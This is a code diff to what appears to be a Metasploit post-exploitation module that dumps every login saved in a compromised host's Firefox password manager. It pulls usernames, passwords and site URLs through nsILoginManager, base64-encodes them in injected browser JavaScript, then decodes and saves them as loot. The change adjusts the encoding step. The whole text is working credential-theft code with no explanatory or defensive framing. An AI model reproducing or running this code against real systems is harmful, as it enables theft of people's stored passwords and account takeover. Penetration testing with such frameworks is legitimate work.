@@ -35,7 +35,11 @@ class Metasploit3 < Msf::Post
     if results.present?
       begin
         passwords = JSON.parse(results)
-        file = store_loot("firefox.passwords.json", "text/json", rhost, results)
+        passwords.each do |entry|
+          entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
+        end
+
+        file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
         print_good("Saved #{passwords.length} passwords to #{file}")
       rescue JSON::ParserError => e
         print_warning(results)
@@ -52,12 +56,15 @@ class Metasploit3 < Msf::Post
                           .getService(Components.interfaces.nsILoginManager);
           var logins = manager.getAllLogins();
           var passwords = [];
+          var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
           var fields = ['password', 'passwordField', 'username', 'usernameField',
                         'httpRealm', 'formSubmitURL', 'hostname'];
 
           var sanitize = function(passwdObj) {
             var sanitized = { };
-            for (var i in fields) { sanitized[fields[i]] = passwdObj[fields[i]]; }
+            for (var i in fields) {
+              sanitized[fields[i]] = b64(passwdObj[fields[i]]);
+            }
             return sanitized;
           }
               
